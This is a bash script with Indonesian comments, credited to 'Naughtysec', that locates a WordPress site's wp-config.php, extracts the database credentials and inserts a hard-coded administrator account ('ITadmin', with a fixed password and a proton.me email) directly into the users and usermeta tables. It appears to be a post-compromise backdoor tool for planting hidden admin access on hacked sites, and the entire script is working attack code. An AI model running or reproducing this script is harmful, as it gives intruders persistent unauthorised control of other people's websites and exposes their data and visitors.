#!/bin/bash

# CREATE BY Naughtysec (Bash Version - dengan ekstraksi yang lebih baik)
# Script untuk menambahkan user administrator WordPress

# Konfigurasi
USER="ITadmin"
USER_PASSWORD="Askurm0m#"
EMAIL="askurmom007@proton.me"

# Fungsi untuk mengekstrak nilai dari wp-config.php dengan berbagai format
extract_db_config() {
    local config_file="$1"
    local var_name="$2"
    local value=""
    
    # Coba berbagai pattern yang mungkin
    # Pattern 1: define('DB_NAME', 'database_name');
    value=$(grep -E "define\s*\(\s*['\"]${var_name}['\"]\s*,\s*['\"]([^'\"]*)['\"]\s*\)" "$config_file" 2>/dev/null | sed -E "s/.*['\"]([^'\"]*)['\"]\s*\).*/\1/" | head -1)
    
    # Jika tidak ditemukan, coba pattern 2: define("DB_NAME", "database_name");
    if [[ -z "$value" ]]; then
        value=$(grep -E "define\s*\(\s*[\"']${var_name}[\"']\s*,\s*[\"']([^\"']*)[\"']\s*\)" "$config_file" 2>/dev/null | sed -E 's/.*["'"'"']([^"'"'"']*)["'"'"']\s*\).*/\1/' | head -1)
    fi
    
    # Jika tidak ditemukan, coba pattern 3 dengan spasi
    if [[ -z "$value" ]]; then
        value=$(grep -E "define\s*\(\s*['\"]${var_name}['\"]\s*,\s*['\"]([^'\"]*)['\"]" "$config_file" 2>/dev/null | sed -E "s/.*['\"]([^'\"]*)['\"].*/\1/" | head -1)
    fi
    
    echo "$value"
}

# Fungsi untuk mengekstrak table prefix
extract_table_prefix() {
    local config_file="$1"
    local prefix=""
    
    # Coba berbagai format $table_prefix
    # Format 1: $table_prefix = 'wp_';
    prefix=$(grep -E "\$table_prefix\s*=\s*['\"]([^'\"]*)['\"]" "$config_file" 2>/dev/null | sed -E "s/.*['\"]([^'\"]*)['\"].*/\1/" | head -1)
    
    # Format 2: $table_prefix = "wp_";
    if [[ -z "$prefix" ]]; then
        prefix=$(grep -E '\$table_prefix\s*=\s*["'"'"']([^"'"'"']*)["'"'"']' "$config_file" 2>/dev/null | sed -E 's/.*["'"'"']([^"'"'"']*)["'"'"'].*/\1/' | head -1)
    fi
    
    echo "$prefix"
}

# Fungsi untuk mendeteksi document root
detect_document_root() {
    local doc_root=""
    
    # Coba dapatkan dari konfigurasi web server
    if command -v apache2ctl &>/dev/null; then
        doc_root=$(apache2ctl -S 2>/dev/null | grep -i "documentroot" | head -1 | awk '{print $2}')
    elif command -v nginx &>/dev/null; then
        doc_root=$(nginx -T 2>/dev/null | grep -i "root" | grep -v "#" | head -1 | awk '{print $2}' | sed 's/;//')
    fi
    
    # Jika tidak ditemukan, coba cari berdasarkan lokasi script atau direktori umum
    if [[ -z "$doc_root" ]] || [[ ! -d "$doc_root" ]]; then
        # Coba beberapa lokasi umum
        COMMON_PATHS=(
            "/var/www/html"
            "/var/www"
            "/usr/share/nginx/html"
            "/home/*/public_html"
            "$HOME/public_html"
            "$(pwd)"
        )
        
        for path in "${COMMON_PATHS[@]}"; do
            if [[ -d "$path" ]] && find "$path" -name "wp-config.php" 2>/dev/null | grep -q .; then
                doc_root="$path"
                break
            fi
        done
    fi
    
    # Jika masih tidak ditemukan, gunakan direktori saat ini
    if [[ -z "$doc_root" ]] || [[ ! -d "$doc_root" ]]; then
        doc_root="$(pwd)"
    fi
    
    echo "$doc_root"
}

# Fungsi untuk mencari wp-config.php
find_wp_config() {
    local search_path="$1"
    local wp_config=""
    
    # Cari di path yang diberikan
    if [[ -f "$search_path/wp-config.php" ]]; then
        wp_config="$search_path/wp-config.php"
    else
        # Coba cari di subdirektori
        wp_config=$(find "$search_path" -maxdepth 3 -name "wp-config.php" 2>/dev/null | head -1)
    fi
    
    # Jika tidak ditemukan, coba di parent directory
    if [[ -z "$wp_config" ]]; then
        local parent=$(dirname "$search_path")
        if [[ -f "$parent/wp-config.php" ]]; then
            wp_config="$parent/wp-config.php"
        fi
    fi
    
    echo "$wp_config"
}

# Debug: Tampilkan isi wp-config.php (tanpa password)
debug_wp_config() {
    local config_file="$1"
    echo "=== DEBUG: Isi wp-config.php (tanpa password) ==="
    grep -E "DB_NAME|DB_USER|DB_PASSWORD|DB_HOST|table_prefix" "$config_file" | grep -v "DB_PASSWORD" || true
    echo "=============================================="
}

# Mulai eksekusi
echo "Mendeteksi document root..."
DOCUMENT_ROOT=$(detect_document_root)
echo "Document root: $DOCUMENT_ROOT"

# Cari wp-config.php
WP_CONFIG=$(find_wp_config "$DOCUMENT_ROOT")

if [[ -z "$WP_CONFIG" ]]; then
    echo "File wp-config.php tidak ditemukan di document root."
    echo "Mencoba mencari di seluruh sistem..."
    WP_CONFIG=$(find / -name "wp-config.php" -path "*/public_html/*" 2>/dev/null | head -1)
    
    if [[ -z "$WP_CONFIG" ]]; then
        echo "File wp-config.php tidak ditemukan."
        exit 1
    fi
fi

echo "Menemukan wp-config.php di: $WP_CONFIG"

# Debug: Tampilkan isi konfigurasi
debug_wp_config "$WP_CONFIG"

# Ekstrak konfigurasi database dengan metode yang lebih baik
echo "Mengekstrak konfigurasi database..."
DB_NAME=$(extract_db_config "$WP_CONFIG" "DB_NAME")
DB_USER=$(extract_db_config "$WP_CONFIG" "DB_USER")
DB_PASSWORD=$(extract_db_config "$WP_CONFIG" "DB_PASSWORD")
DB_HOST=$(extract_db_config "$WP_CONFIG" "DB_HOST")
TABLE_PREFIX=$(extract_table_prefix "$WP_CONFIG")

# Debug: Tampilkan hasil ekstraksi
echo "=== HASIL EKSTRAKSI ==="
echo "DB_NAME: $DB_NAME"
echo "DB_USER: $DB_USER"
echo "DB_HOST: $DB_HOST"
echo "TABLE_PREFIX: $TABLE_PREFIX"
echo "DB_PASSWORD: [HIDDEN]"
echo "======================"

if [[ -z "$DB_NAME" ]] || [[ -z "$DB_USER" ]] || [[ -z "$DB_PASSWORD" ]]; then
    echo "Gagal mengekstrak konfigurasi database dari wp-config.php"
    echo ""
    echo "Mencoba metode alternatif: membaca langsung dari file..."
    
    # Metode alternatif: source file php dengan php-cli
    if command -v php &>/dev/null; then
        echo "Mencoba menggunakan PHP untuk mengekstrak konfigurasi..."
        
        # Buat script PHP temporer untuk mengekstrak konfigurasi
        PHP_SCRIPT=$(cat <<'EOF'
<?php
$wp_config = '/var/www/html/wp-config.php';
if (file_exists($wp_config)) {
    require_once($wp_config);
    echo "DB_NAME=" . DB_NAME . "\n";
    echo "DB_USER=" . DB_USER . "\n";
    echo "DB_PASSWORD=" . DB_PASSWORD . "\n";
    echo "DB_HOST=" . DB_HOST . "\n";
    echo "TABLE_PREFIX=" . $table_prefix . "\n";
}
?>
EOF
)
        
        # Ganti path dengan yang sebenarnya
        PHP_SCRIPT=$(echo "$PHP_SCRIPT" | sed "s|/var/www/html/wp-config.php|$WP_CONFIG|g")
        
        # Jalankan PHP script
        TEMP_PHP=$(mktemp)
        echo "$PHP_SCRIPT" > "$TEMP_PHP"
        
        # Eksekusi dan tangkap output
        PHP_OUTPUT=$(php "$TEMP_PHP" 2>/dev/null)
        rm -f "$TEMP_PHP"
        
        # Parse output
        if [[ -n "$PHP_OUTPUT" ]]; then
            DB_NAME=$(echo "$PHP_OUTPUT" | grep "^DB_NAME=" | cut -d'=' -f2)
            DB_USER=$(echo "$PHP_OUTPUT" | grep "^DB_USER=" | cut -d'=' -f2)
            DB_PASSWORD=$(echo "$PHP_OUTPUT" | grep "^DB_PASSWORD=" | cut -d'=' -f2)
            DB_HOST=$(echo "$PHP_OUTPUT" | grep "^DB_HOST=" | cut -d'=' -f2)
            TABLE_PREFIX=$(echo "$PHP_OUTPUT" | grep "^TABLE_PREFIX=" | cut -d'=' -f2)
            
            echo "Berhasil mengekstrak dengan PHP!"
            echo "DB_NAME: $DB_NAME"
            echo "DB_USER: $DB_USER"
            echo "DB_HOST: $DB_HOST"
            echo "TABLE_PREFIX: $TABLE_PREFIX"
        else
            echo "Gagal mengekstrak dengan PHP."
            exit 1
        fi
    else
        echo "PHP tidak ditemukan. Tidak bisa menggunakan metode alternatif."
        exit 1
    fi
fi

# Validasi hasil ekstraksi
if [[ -z "$DB_NAME" ]] || [[ -z "$DB_USER" ]] || [[ -z "$DB_PASSWORD" ]]; then
    echo "Error: Tidak bisa mendapatkan konfigurasi database yang lengkap."
    echo "DB_NAME: $DB_NAME"
    echo "DB_USER: $DB_USER"
    echo "DB_PASSWORD: [HIDDEN]"
    exit 1
fi

# Cek koneksi database
echo "Menguji koneksi database..."
if ! mysql -h "$DB_HOST" -u "$DB_USER" -p"$DB_PASSWORD" -e "SELECT 1" "$DB_NAME" &>/dev/null; then
    echo "Gagal terhubung ke database. Periksa kredensial."
    echo "Mencoba tanpa host..."
    if ! mysql -u "$DB_USER" -p"$DB_PASSWORD" -e "SELECT 1" "$DB_NAME" &>/dev/null; then
        echo "Masih gagal terhubung. Periksa konfigurasi database Anda."
        exit 1
    else
        DB_HOST="localhost"
        echo "Berhasil terhubung dengan localhost"
    fi
else
    echo "Berhasil terhubung ke database!"
fi

# Buat password hash MD5
PASSWORD_HASH=$(echo -n "$USER_PASSWORD" | md5sum | cut -d' ' -f1)

# Insert user ke wp_users
echo "Menambahkan user $USER ke database..."
SQL_USER="INSERT INTO ${TABLE_PREFIX}users (user_login, user_pass, user_email, user_status, user_registered, user_nicename) VALUES ('$USER', '$PASSWORD_HASH', '$EMAIL', '0', '$(date +'%Y-%m-%d %H:%M:%S')', 'Staff')"

mysql -h "$DB_HOST" -u "$DB_USER" -p"$DB_PASSWORD" "$DB_NAME" -e "$SQL_USER" 2>/dev/null

if [[ $? -eq 0 ]]; then
    echo "✓ Berhasil! $USER telah dibuat dengan kata sandi: $USER_PASSWORD"
    
    # Dapatkan ID user terakhir
    USER_ID=$(mysql -h "$DB_HOST" -u "$DB_USER" -p"$DB_PASSWORD" "$DB_NAME" -sN -e "SELECT LAST_INSERT_ID()" 2>/dev/null)
    
    if [[ -z "$USER_ID" ]] || [[ "$USER_ID" -eq 0 ]]; then
        # Coba dapatkan ID dengan cara lain
        USER_ID=$(mysql -h "$DB_HOST" -u "$DB_USER" -p"$DB_PASSWORD" "$DB_NAME" -sN -e "SELECT ID FROM ${TABLE_PREFIX}users WHERE user_login='$USER' ORDER BY ID DESC LIMIT 1" 2>/dev/null)
    fi
    
    echo "User ID: $USER_ID"
    
    # Insert ke wp_usermeta
    echo "Mengatur role administrator..."
    SQL_META1="INSERT INTO ${TABLE_PREFIX}usermeta (umeta_id, user_id, meta_key, meta_value) VALUES (NULL, $USER_ID, '${TABLE_PREFIX}capabilities', 'a:1:{s:13:\"administrator\";b:1;}')"
    SQL_META2="INSERT INTO ${TABLE_PREFIX}usermeta (umeta_id, user_id, meta_key, meta_value) VALUES (NULL, $USER_ID, '${TABLE_PREFIX}user_level', '10')"
    
    mysql -h "$DB_HOST" -u "$DB_USER" -p"$DB_PASSWORD" "$DB_NAME" -e "$SQL_META1" 2>/dev/null
    mysql -h "$DB_HOST" -u "$DB_USER" -p"$DB_PASSWORD" "$DB_NAME" -e "$SQL_META2" 2>/dev/null
    
    if [[ $? -eq 0 ]]; then
        echo "✓ User $USER berhasil di-set sebagai administrator!"
        echo ""
        echo "=== INFORMASI LOGIN ==="
        echo "Username: $USER"
        echo "Password: $USER_PASSWORD"
        echo "Email: $EMAIL"
        echo "Role: Administrator"
        echo "======================"
    else
        echo "Error saat memasukkan data tambahan ke dalam tabel wp_usermeta."
    fi
else
    echo "Error saat memasukkan data ke dalam tabel wp_users."
    echo "Mungkin user '$USER' sudah ada di database."
    
    # Cek apakah user sudah ada
    CHECK_USER=$(mysql -h "$DB_HOST" -u "$DB_USER" -p"$DB_PASSWORD" "$DB_NAME" -sN -e "SELECT COUNT(*) FROM ${TABLE_PREFIX}users WHERE user_login='$USER'" 2>/dev/null)
    if [[ "$CHECK_USER" -gt 0 ]]; then
        echo "User '$USER' sudah ada. Tidak perlu menambahkan lagi."
    fi
fi
